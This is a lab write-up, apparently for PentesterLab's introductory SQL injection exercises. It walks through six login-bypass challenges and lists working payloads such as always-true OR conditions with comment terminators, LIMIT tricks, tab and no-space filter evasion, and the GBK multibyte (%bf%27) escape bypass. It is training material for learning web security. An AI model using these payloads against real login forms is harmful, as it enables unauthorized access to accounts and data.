
# Essential: SQL Injection 01

# SQL injections

* `SQL injections` are one of the most common (web) vulnerabilities. All `SQL` injections exercises, found here, use `MySQL` for back-end. SQL injections come from a lack of `encoding`/`escaping` of user-controlled input when included in `SQL queries`.

* Depending on how the information gets added in the query, you will need different things to break the syntax. There are three different ways to echo information in a SQL statement:

	* `Using quotes`: single quote or double quote.

	* Using `back-ticks.`

	* Directly.

* The way information is echoed back, and even what separator is used, will decide the detection technique to use. However, you don't have this information, and you will need to try to guess it. You will need to formulate hypotheses and try to verify them. That's why spending time poking around with these examples is so important.

* In this challenge, you will need to bypass the login page using `SQL injection`. The SQL query looks something like:

	* `SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]'`;
	* Where: `[USER]` and `[PASSWORD]` are the values you submitted.

* The logic behind the authentication is:

	* if the query returns at least one result, you're in

	* if the query returns no result, you have not provided a valid `username` and `password.`

* Our goal is to make the query return at least one result. To do so we are going to inject a condition that is always true: `1=1`. To do that, we are going to:

	* Break outside of the `single quote` to be able to inject `SQL` using a `single quote`.

	* Add a `OR` keyword to make sure the comparison is always `true`.

	* Add our always true comparison: `1=1`

* Comment out the remaining query using `-- ` (the space at the end matters) or `#`.

* If we put everything together, we get our payload. 

* You can access this exercise using the following URL: [http://ptl-e6806e31-6103d0c1.libcurl.so/](http://ptl-e6806e31-6103d0c1.libcurl.so/) . You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-e6806e31-6103d0c1.libcurl.so/](https://ptl-e6806e31-6103d0c1.libcurl.so/) .

* ` username = '....' and password = md5('....') `

* In `username` feild : In `password` feild  

* `admin' or '1'='1`  : `AnyJunk`   so the query becomes ` username = 'admin' or '1'='1' and password = md5('AnyJunk') ` 
* `admin' or '1'='1' -- `  :  `AnyJunk`  (make sure you have space after `--` in username feild)
* `admin' or '1'='1' #`  :  `AnyJunk`
* `admin' or 1=1 -- `  :  `AnyJunk`  (make sure you have space after `--` in username feild)
* `admin' or 1=1 #`  :  `AnyJunk`
* `admin`  : `test') or 1=1 #`  so the query becomes  ` username = 'admin' and password = md5('test') or 1=1 # ') `
* `admin`  : `test') or ('1'='1`  so the query becomes  ` username = 'admin' and password = md5('test') or ('1'='1') `
* `admin` : `test') or ('1'='1') #`

* You can do it in many ways but syntax formed after substituting these fields in query should be correct.

# Essential: SQL Injection 02

* In the previous challenge, we saw that `SQL` string can use `single quote` or `double quote`. Let's adapt our payload from the previous challenge to work with this one.

* You can access this exercise using the following URL: [http://ptl-be01c426-7b8a9cd6.libcurl.so/](http://ptl-be01c426-7b8a9cd6.libcurl.so/) . You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-be01c426-7b8a9cd6.libcurl.so/](https://ptl-be01c426-7b8a9cd6.libcurl.so/) .

* ` username = "...." and password = md5("....") `

* We can use above payload by replacing `"` instead of `'`.

# Essential: SQL Injection 03

* In this exercise, the developer checked that only one result is return by the database. You should be able to bypass this check by using the keyword `LIMIT.`

* You can access this exercise using the following URL: [http://ptl-90899dda-22429609.libcurl.so/](http://ptl-90899dda-22429609.libcurl.so/) . You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-90899dda-22429609.libcurl.so/](https://ptl-90899dda-22429609.libcurl.so/) .

* ` username = '....' and password = md5('....') `

* In `username` feild : In `password` feild  

* `admin` : `test') or 1=1 LIMIT 1 #` so the query becomes `username = 'admin' and password = md5('test') or 1=1 LIMIT 1 #') `

* `admin' or 1=1 LIMIT 1 -- ` : `AnyJunk` so the query becomes ` username = 'admin' or 1=1 LIMIT 1 -- ' and PASSWORDd = md5('AnyJunk') `


# Essential: SQL Injection 04

* In this example, the error message gives away the protection created by the developer: `NO SPACE`. This error message appears as soon as a space is injected inside the request. 

* It prevents us from using the `' or '1'='1` method, or any fingerprinting that uses the space character.

* However, this filtering is easily bypassed, using tabulation (`HT` or `\t`). You will need to use encoding, to use it inside the `HTTP` request. Using this simple bypass, you should be able to see how to detect this vulnerability.

* You intercept the reqeust in `burp` and replace `space`  with `tab`(`\t`) i.e, `%09` in url encode.

* so payload `admin' or 1=1 -- ` after encoding will become `admin%27+or+1%3D1+--+` , here you can replace `space` i.e, `+` with `%09` so it becomes `admin%27%09or%091%3D1%09--%09`.

# Essential: SQL Injection 05

* In this example, the developer blocks `spaces` and `tabulations.` There is a way to bypass this filter. You can:

	* you don't need `spaces` between the `keywords` in your injection.

	* you can use `#` instead of `--` (if necessary).

* By applying these tricks, you should be able to exploit this vulnerability.

* You can access this exercise using the following URL: [http://ptl-47d30e08-4a057d1a.libcurl.so/](http://ptl-47d30e08-4a057d1a.libcurl.so/) . You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-47d30e08-4a057d1a.libcurl.so/](https://ptl-47d30e08-4a057d1a.libcurl.so/) .


* `admin'or'1'='1'#` works

* `admin'||'1'='1'#` works fine

* `admin'or1=1#` not working because `or`,`1` is interpeted as `or1`  , you can use `||` instead of `or`.

* `admin'||1=1#` works fine

* `admin'||1#` works as `1=1` is nothing but `1` which is `true`


# Essential: SQL Injection 06

* This example was first published in 2006 on [`Chris Shiflett's Blog`](http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string) as a way to `bypass addslashes`. It relies on the way `MySQL` will perform `escaping`. It will depend on the `charset` used by the connection. 

* If the `database driver` is not aware of the `charset` used it will not perform the right `escaping` and create an exploitable situation. 

* This exploit relies on the usage of `GBK`. `GBK` is a `character set` for simplified `Chinese`.

* Using the fact that the `database driver` and the `database` don't `talk` the same `charset`, it's possible to generate a `single quote` and break out of the `SQL` syntax to inject a payload.

* Using the string `\xBF'` (URL-encoded as `%bf%27`), it's possible to get a `single quote` that will not get escaped properly. It's therefore possible to inject an `always-true condition` using `%bf%27 or 1=1 -- ` and bypass the authentication.

* As a side note, this issue can be remediated by setting up the `connection encoding` to `GBK` instead of using an `SQL` query (which is the source of this issue). 

* Here the problem comes from the execution of the following query:

	* `SET CHARACTER SET 'GBK';`

* It is a pretty unlikely issue for a web application but it's always good to know that it exists, especially if you play `CTFs`.

* You can access this exercise using the following URL: [http://ptl-8b83be21-c62eb839.libcurl.so/](http://ptl-8b83be21-c62eb839.libcurl.so/) . You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-8b83be21-c62eb839.libcurl.so/](https://ptl-8b83be21-c62eb839.libcurl.so/) .

* `admin'||1#` --urlencodeing---> `admin%27%7C%7C1%23`  ---replace `%27` with `%bf%27` ------>  `admin%bf%27%7C%7C1%23`